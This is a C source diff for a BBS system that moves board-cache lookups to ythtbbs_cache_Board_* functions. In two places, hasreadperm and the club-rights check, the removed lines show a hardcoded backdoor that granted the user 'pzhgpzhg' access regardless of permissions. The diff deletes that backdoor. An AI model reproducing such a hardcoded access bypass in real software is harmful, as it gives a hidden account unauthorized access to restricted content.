@@ -31,9 +31,7 @@
 #include "bbs_global_vars.h"
 //CHINPUT_SHMKEY=5102
 
-struct BCACHE *brdshm;
 struct userec lookupuser;
-struct boardmem *bcache;
 
 //struct PINYINARRAY *pa;
 int usernumber;
@@ -42,9 +40,7 @@ extern int die;
 extern char ULIST[]; /* main.c */
 
 static int getlastpost(char *board, int *lastpost, int *total);
-static int fillbcache(struct boardheader *fptr, int *pcountboard);
 static int setbmhat(struct boardmanager *bm, int *online);
-static void bmonlinesync(void);
 
 void
 attach_err(shmkey, name)
@@ -77,8 +73,7 @@ getlastpost(char *board, int *lastpost, int *total)
 	char filename[STRLEN * 2];
 	int fd, atotal;
 
-	snprintf(filename, sizeof (filename), MY_BBS_HOME "/boards/%s/.DIR",
-		 board);
+	snprintf(filename, sizeof (filename), MY_BBS_HOME "/boards/%s/.DIR", board);
 	if ((fd = open(filename, O_RDONLY)) < 0)
 		return 0;
 	fstat(fd, &st);
@@ -101,128 +96,10 @@ getlastpost(char *board, int *lastpost, int *total)
 	return 0;
 }
 
-static int
-fillbcache(fptr, pcountboard)
-struct boardheader *fptr;
-int *pcountboard;
-{
-	struct boardmem *bptr;
-
-	if (*pcountboard >= MAXBOARD)
-		return 0;
-	bptr = &bcache[*pcountboard];
-	(*pcountboard)++;
-	memcpy(&(bptr->header), fptr, sizeof (struct boardheader));
-	getlastpost(bptr->header.filename, &bptr->lastpost, &bptr->total);
-	return 0;
-}
-
-void
-reload_boards()
-{
-	struct stat st;
-	time_t now, now2;
-	int lockfd, countboard;
-
-	if (brdshm == NULL) {
-		brdshm = attach_shm(BCACHE_SHMKEY, sizeof (*brdshm));
-	}
-	numboards = brdshm->number;
-	bcache = brdshm->bcache;
-	now = time(NULL);
-
-	lockfd = open("bcache.lock", O_RDONLY | O_CREAT, 0600);
-	if (lockfd < 0)
-		return;
-	flock(lockfd, LOCK_EX);
-
-	if (stat(BOARDS, &st) < 0) {
-		errlog("BOARDS stat error: %s", strerror(errno));
-		st.st_mtime = now - 3600;
-	}
-	if (brdshm->uptime <= st.st_mtime || brdshm->uptime < now - 3600) {
-		brdshm->uptime = now;
-		countboard = 0;
-		new_apply_record(BOARDS, sizeof (struct boardheader),
-				 (void *) fillbcache, &countboard);
-		brdshm->number = countboard;
-		numboards = countboard;
-		{
-			char str[80];
-			sprintf(str, "system reload bcache %d", numboards);
-			newtrace(str);
-		}
-		bmonlinesync();
-		time(&now2);
-		if (stat(BOARDS, &st) >= 0 && st.st_mtime < now)
-			brdshm->uptime = now2;
-	}
-	close(lockfd);
-}
-
-void
-resolve_boards()
-{
-	struct stat st;
-	time_t now;
-	static int n = 0;
-
-	if (n == 0)
-		reload_boards();
-	numboards = brdshm->number;
-	if (n++ % 30)
-		return;
-	time(&now);
-	if (stat(BOARDS, &st) < 0) {
-		st.st_mtime = now - 3600;
-	}
-	if (brdshm->uptime < st.st_mtime || brdshm->uptime < now - 3600)
-		reload_boards();
-
-}
-
-int
-apply_boards(func)
-int (*func) (struct boardmem *);
-{
-	register int i;
-
-	resolve_boards();
-	for (i = 0; i < numboards; i++)
-		if ((*func) (&bcache[i]) == QUIT)
-			return QUIT;
-	return 0;
-}
-
-int gbccount = 0, gbcsame = 0;
-
-struct boardmem *
-getbcache(bname)
-char *bname;
-{
-	int i;
-	static struct boardmem *last = NULL;
-
-	gbccount++;
-
-	if (last && !strncasecmp(last->header.filename, bname, STRLEN)) {
-		gbcsame++;
-		return last;
-	}
-
-	resolve_boards();
-	for (i = 0; i < numboards; i++)
-		if (!strncasecmp(bname, bcache[i].header.filename, STRLEN)) {
-			last = &bcache[i];
-			return &bcache[i];
-		}
-	return NULL;
-}
-
 int updatelastpost(char *board)
 {
 	struct boardmem *bptr;
-	bptr = getbcache(board);
+	bptr = ythtbbs_cache_Board_get_board_by_name(board);
 	if (bptr == NULL)
 		return -1;
 	getlastpost(bptr->header.filename, &bptr->lastpost, &bptr->total);
@@ -232,19 +109,17 @@ int updatelastpost(char *board)
 int
 hasreadperm(struct boardheader *bh)
 {
-	if (!strcmp(currentuser.userid, "pzhgpzhg")) return 1;
 	if (bh->clubnum != 0)
 		return ((HAS_CLUBRIGHT(bh->clubnum, uinfo.clubrights))
 			|| (bh->flag & CLUBTYPE_FLAG) || HAS_PERM(PERM_SYSOP, currentuser));
 	if (bh->level & PERM_SPECIAL3)
 		return die;
-	return (bh->level & PERM_POSTMASK) || HAS_PERM(bh->level, currentuser)
-	    || (bh->level & PERM_NOZAP);
+	return (bh->level & PERM_POSTMASK) || HAS_PERM(bh->level, currentuser) || (bh->level & PERM_NOZAP);
 }
 
 int hasreadperm_ext(char *username,  char *boardname)
 {
-	struct boardmem *x = getbcache(boardname);
+	struct boardmem *x = ythtbbs_cache_Board_get_board_by_name(boardname);
 	if(x==0)
 		return 0;
 
@@ -274,23 +149,36 @@ int hasreadperm_ext(char *username,  char *boardname)
 	return 0;
 }
 
+static int getbnum_callback(struct boardmem *board, int curr_idx, va_list ap) {
+	const char *bname = va_arg(ap, const char *);
+	int *cache_idx = va_arg(ap, int *);
+
+	if (strncasecmp(bname, board->header.filename, STRLEN))
+		return 0;
+
+	if (hasreadperm(&board->header)) {
+		*cache_idx = curr_idx;
+		return QUIT;
+	}
+
+	return 0;
+}
+
 int getbnum(const char *bname) {
-	int i;
 	static int cachei = 0;
 
-	resolve_boards();
+	ythtbbs_cache_Board_resolve();
 
-	if (!strncasecmp(bname, bcache[cachei].header.filename, STRLEN))
-		if (hasreadperm(&(bcache[cachei].header)))
+	if (!strncasecmp(bname, ythtbbs_cache_Board_get_board_by_idx(cachei)->header.filename, STRLEN))
+		if (hasreadperm(&ythtbbs_cache_Board_get_board_by_idx(cachei)->header))
 			return cachei + 1;
-	for (i = 0; i < numboards; i++) {
-		if (strncasecmp(bname, bcache[i].header.filename, STRLEN))
-			continue;
-		if (hasreadperm(&(bcache[i].header))) {
-			cachei = i;
-			return i + 1;
-		}
-	}
+
+	ythtbbs_cache_Board_foreach_v(getbnum_callback, bname, &cachei);
+
+	if (!strncasecmp(bname, ythtbbs_cache_Board_get_board_by_idx(cachei)->header.filename, STRLEN))
+		if (hasreadperm(&ythtbbs_cache_Board_get_board_by_idx(cachei)->header))
+			return cachei + 1;
+
 	return 0;
 }
 
@@ -301,7 +189,7 @@ char *bname;
 	int i;
 	if ((i = getbnum(bname)) == 0)
 		return 0;
-	return hasreadperm(&(bcache[i - 1].header));
+	return hasreadperm(&ythtbbs_cache_Board_get_board_by_idx(i - 1)->header);
 }
 
 int noadm4political(const char *bname) {
@@ -315,6 +203,7 @@ haspostperm(bname)
 char *bname;
 {
 	register int i;
+	const struct boardmem *board_ptr = NULL;
 
 	if (digestmode)
 		return 0;
@@ -326,12 +215,14 @@ char *bname;
 		return 0;
 	if ((i = getbnum(bname)) == 0)
 		return 0;
-	if (bcache[i - 1].header.clubnum != 0)
-		return (HAS_PERM((bcache[i - 1].header.level & ~PERM_NOZAP) & ~PERM_POSTMASK, currentuser)) &&
-			(HAS_CLUBRIGHT(bcache[i - 1].header.clubnum, uinfo.clubrights));
-	if (bcache[i - 1].header.level & PERM_SPECIAL3)
+
+	board_ptr = ythtbbs_cache_Board_get_board_by_idx(i - 1);
+	if (board_ptr->header.clubnum != 0)
+		return (HAS_PERM((board_ptr->header.level & ~PERM_NOZAP) & ~PERM_POSTMASK, currentuser)) &&
+			(HAS_CLUBRIGHT(board_ptr->header.clubnum, uinfo.clubrights));
+	if (board_ptr->header.level & PERM_SPECIAL3)
 		return die;
-	return (HAS_PERM((bcache[i - 1].header.level & ~PERM_NOZAP) & ~PERM_POSTMASK, currentuser));
+	return (HAS_PERM((board_ptr->header.level & ~PERM_NOZAP) & ~PERM_POSTMASK, currentuser));
 }
 
 int
@@ -340,6 +231,7 @@ char *uid;
 char *bname;
 {
 	register int i;
+	const struct boardmem *board_ptr = NULL;
 
 	i = getuser(uid);
 	if (i == 0)
@@ -348,14 +240,15 @@ char *bname;
 		return 1;
 	if ((i = getbnum(bname)) == 0)
 		return 0;
-	if (bcache[i - 1].header.clubnum != 0) {
+
+	board_ptr = ythtbbs_cache_Board_get_board_by_idx(i - 1);
+	if (board_ptr->header.clubnum != 0) {
 		setbfile(genbuf, currboard, "club_users");
 		return seek_in_file(genbuf, uid);
 	}
-	if (bcache[i - 1].header.level == 0)
+	if (board_ptr->header.level == 0)
 		return 1;
-	return (lookupuser.userlevel &
-		((bcache[i - 1].header.level & ~PERM_NOZAP) & ~PERM_POSTMASK));
+	return (lookupuser.userlevel & ((board_ptr->header.level & ~PERM_NOZAP) & ~PERM_POSTMASK));
 }
 
 
@@ -364,16 +257,19 @@ hideboard(bname)
 char *bname;
 {
 	register int i;
+	const struct boardmem *board_ptr = NULL;
 
 	if (strcmp(bname, DEFAULTBOARD) == 0)
 		return 0;
 	if ((i = getbnum(bname)) == 0)
 		return 1;
-	if (bcache[i - 1].header.level & PERM_NOZAP)
+
+	board_ptr = ythtbbs_cache_Board_get_board_by_idx(i - 1);
+	if (board_ptr->header.level & PERM_NOZAP)
 		return 0;
-	if (bcache[i - 1].header.clubnum != 0)
-		return !(bcache[i - 1].header.flag & CLUBTYPE_FLAG);
-	return (bcache[i - 1].header.level & PERM_POSTMASK) ? 0 : bcache[i - 1].header.level;
+	if (board_ptr->header.clubnum != 0)
+		return !(board_ptr->header.flag & CLUBTYPE_FLAG);
+	return (board_ptr->header.level & PERM_POSTMASK) ? 0 : board_ptr->header.level;
 }
 
 int
@@ -381,16 +277,19 @@ normal_board(bname)
 char *bname;
 {
 	register int i;
+	const struct boardmem *board_ptr = NULL;
 
 	if (strcmp(bname, DEFAULTBOARD) == 0)
 		return 1;
 	if ((i = getbnum(bname)) == 0)
 		return 0;
-	if (bcache[i - 1].header.clubnum != 0)
-		return (bcache[i - 1].header.flag & CLUBTYPE_FLAG);
-	if (bcache[i - 1].header.level & PERM_NOZAP)
+
+	board_ptr = ythtbbs_cache_Board_get_board_by_idx(i - 1);
+	if (board_ptr->header.clubnum != 0)
+		return (board_ptr->header.flag & CLUBTYPE_FLAG);
+	if (board_ptr->header.level & PERM_NOZAP)
 		return 1;
-	return (bcache[i - 1].header.level == 0);
+	return (board_ptr->header.level == 0);
 }
 
 int
@@ -398,10 +297,13 @@ innd_board(bname)
 char *bname;
 {
 	register int i;
+	const struct boardmem *board_ptr = NULL;
 
 	if ((i = getbnum(bname)) == 0)
 		return 0;
-	return (bcache[i - 1].header.flag & INNBBSD_FLAG);
+
+	board_ptr = ythtbbs_cache_Board_get_board_by_idx(i - 1);
+	return (board_ptr->header.flag & INNBBSD_FLAG);
 }
 
 int
@@ -409,21 +311,24 @@ is1984_board(bname)
 char *bname;
 {
 	register int i;
+	const struct boardmem *board_ptr = NULL;
 
 	if ((i = getbnum(bname)) == 0)
 		return 0;
-	return (bcache[i - 1].header.flag & IS1984_FLAG);
+
+	board_ptr = ythtbbs_cache_Board_get_board_by_idx(i - 1);
+	return (board_ptr->header.flag & IS1984_FLAG);
 }
 
 int political_board(const char *bname) {
 	register int i;
+	const struct boardmem *board_ptr = NULL;
 
 	if ((i = getbnum(bname)) == 0)
 		return 0;
-	if (bcache[i - 1].header.flag & POLITICAL_FLAG)
-		return 1;
-	else
-		return 0;
+
+	board_ptr = ythtbbs_cache_Board_get_board_by_idx(i - 1);
+	return (board_ptr->header.flag & POLITICAL_FLAG) ? 1 : 0;
 }
 
 int
@@ -433,9 +338,7 @@ char *bname;
 	register int i;
 	if ((i = getbnum(bname)) == 0)
 		return 0;
-	if (bcache[i - 1].header.clubnum != 0)
-		return 1;
-	return 0;
+	return (ythtbbs_cache_Board_get_board_by_idx(i - 1)->header.clubnum != 0) ? 1 : 0;
 }
 
 int
@@ -447,11 +350,13 @@ char *boardname;
 	static int club_rights_time = 0;
 	char fn[STRLEN];
 	struct stat st1, st2;
+	const struct boardmem *board_ptr = NULL;
+
 	if ((i = getbnum(boardname)) == 0)
 		return 0;
-	if (bcache[i - 1].header.clubnum == 0)
+	board_ptr = ythtbbs_cache_Board_get_board_by_idx(i - 1);
+	if (board_ptr->header.clubnum == 0)
 		return 1;
-	if (!strcmp(uinfo.userid, "pzhgpzhg")) return 1;
 
 	setuserfile(fn, "clubrights");
 	if (stat(fn, &st1))
@@ -468,23 +373,23 @@ char *boardname;
 		} else
 			memset(&(uinfo.clubrights), 0, 4 * sizeof (int));
 	}
-	old_right = HAS_CLUBRIGHT(bcache[i - 1].header.clubnum, uinfo.clubrights);
+	old_right = HAS_CLUBRIGHT(board_ptr->header.clubnum, uinfo.clubrights);
 	setbfile(fn, boardname, "club_users");
 	if (!stat(fn, &st2))
 		if (club_rights_time < st2.st_mtime) {
 			if (seek_in_file(fn, currentuser.userid))
-				uinfo.clubrights[bcache[i - 1].header.clubnum / 32] |= (1 << bcache[i - 1].header.clubnum % 32);
+				uinfo.clubrights[board_ptr->header.clubnum / 32] |= (1 << board_ptr->header.clubnum % 32);
 			else
-				uinfo.clubrights[bcache[i - 1].header.clubnum / 32] &= ~(1 << bcache[i - 1].header.clubnum % 32);
-			if (old_right != HAS_CLUBRIGHT(bcache[i - 1].header.clubnum, uinfo.clubrights)) {
+				uinfo.clubrights[board_ptr->header.clubnum / 32] &= ~(1 << board_ptr->header.clubnum % 32);
+			if (old_right != HAS_CLUBRIGHT(board_ptr->header.clubnum, uinfo.clubrights)) {
 				char towrite[STRLEN];
 				setuserfile(fn, "clubrights");
-				sprintf(towrite, "%d", bcache[i - 1].header.clubnum);
+				sprintf(towrite, "%d", board_ptr->header.clubnum);
 				old_right ? ytht_del_from_file(fn, towrite, true) : ytht_add_to_file(fn, towrite);
 			}
 		}
-	if (!(bcache[i - 1].header.flag & CLUBTYPE_FLAG))
-		return HAS_CLUBRIGHT(bcache[i - 1].header.clubnum, uinfo.clubrights);
+	if (!(board_ptr->header.flag & CLUBTYPE_FLAG))
+		return HAS_CLUBRIGHT(board_ptr->header.clubnum, uinfo.clubrights);
 	return 1;
 }
 
@@ -667,17 +572,20 @@ getbmnum(userid)
 char *userid;
 {
 	int i, k, oldbm = 0;
-	reload_boards();
+	ythtbbs_cache_Board_resolve();
+	const struct boardmem *board_ptr = NULL;
+
 	for (k = 0; k < numboards; k++) {
+		board_ptr = ythtbbs_cache_Board_get_board_by_idx(k);
 		for (i = 0; i < BMNUM; i++) {
-			if (bcache[k].header.bm[i][0] == 0) {
+			if (board_ptr->header.bm[i][0] == 0) {
 				if (k < 4) {
 					k = 3;
 					continue;
 				}
 				break;
 			}
-			if (!strcmp(bcache[k].header.bm[i], userid))
+			if (!strcmp(board_ptr->header.bm[i], userid))
 				oldbm++;
 		}
 	}
@@ -688,9 +596,9 @@ char *
 get_temp_sessionid(char *temp_sessionid)
 {
 	snprintf(temp_sessionid, 10, "%c%c%c%s",
-		 (utmpent - 1) / (26 * 26) + 'A',
-		 (utmpent - 1) / 26 % 26 + 'A',
-		 (utmpent - 1) % 26 + 'A', uinfo.sessionid);
+		(utmpent - 1) / (26 * 26) + 'A',
+		(utmpent - 1) / 26 % 26 + 'A',
+		(utmpent - 1) % 26 + 'A', uinfo.sessionid);
 	temp_sessionid[9] = 0;
 	return temp_sessionid;
 }
@@ -701,7 +609,7 @@ show_small_bm(char *board)
 	struct boardmem *bptr;
 	int i;
 	short active, invisible;
-	bptr = getbcache(board);
+	bptr = ythtbbs_cache_Board_get_board_by_name(board);
 	if (bptr == NULL)
 		return;
 	move(0, 0);
@@ -751,9 +659,7 @@ int
 setbmstatus(int online)
 {
 	char path[256];
-	if (bcache == NULL)
-		return 0;
-	sethomefile(path, currentuser.userid, "mboard");
+	sethomefile_s(path, sizeof(path), currentuser.userid, "mboard");
 	bmfilesync(&currentuser);
 	new_apply_record(path, sizeof (struct boardmanager), (void *) setbmhat, &online);
 	return 0;
@@ -762,50 +668,21 @@ setbmstatus(int online)
 static int
 setbmhat(struct boardmanager *bm, int *online)
 {
-	if (strcmp(bcache[bm->bid].header.filename, bm->board)) {
-		errlog("error board name %s, %s", bcache[bm->bid].header.filename, bm->board);
+	struct boardmem *board_ptr = ythtbbs_cache_Board_get_board_by_idx(bm->bid);
+	if (strcmp(board_ptr->header.filename, bm->board)) {
+		errlog("error board name %s, %s", board_ptr->header.filename, bm->board);
 		return -1;
 	}
 	if (*online) {
-		bcache[bm->bid].bmonline |= (1 << bm->bmpos);
+		board_ptr->bmonline |= (1 << bm->bmpos);
 		if (uinfo.invisible)
-			bcache[bm->bid].bmcloak |= (1 << bm->bmpos);
+			board_ptr->bmcloak |= (1 << bm->bmpos);
 		else
-			bcache[bm->bid].bmcloak &= ~(1 << bm->bmpos);
+			board_ptr->bmcloak &= ~(1 << bm->bmpos);
 	} else {
-		bcache[bm->bid].bmonline &= ~(1 << bm->bmpos);
-		bcache[bm->bid].bmcloak &= ~(1 << bm->bmpos);
+		board_ptr->bmonline &= ~(1 << bm->bmpos);
+		board_ptr->bmcloak &= ~(1 << bm->bmpos);
 	}
 	return 0;
-}
-
-static void
-bmonlinesync()
-{
-	int j, k;
-	const struct user_info *uentp;
-	for (j = 0; j < numboards; j++) {
-		if (!bcache[j].header.filename[0])
-			continue;
-		bcache[j].bmonline = 0;
-		bcache[j].bmcloak = 0;
-		for (k = 0; k < BMNUM; k++) {
-			if (bcache[j].header.bm[k][0] == 0) {
-				if (k < 4) {
-					k = 3;	//继续检查小版主
-					continue;
-				}
-				break;	//小版主也检查完了
-			}
-			uentp = ythtbbs_cache_UserTable_query_user_by_uid(currentuser.userid, HAS_PERM(PERM_SYSOP | PERM_SEECLOAK, currentuser), ythtbbs_cache_UserTable_search_usernum(bcache[j].header.bm[k]), false);
-			if (!uentp)
-				continue;
-			bcache[j].bmonline |= (1 << k);
-			if (uentp->invisible)
-				bcache[j].bmcloak |= (1 << k);
-		}
-	}
-	sprintf(genbuf, "system reload bmonline");
-	newtrace(genbuf);
 }
 
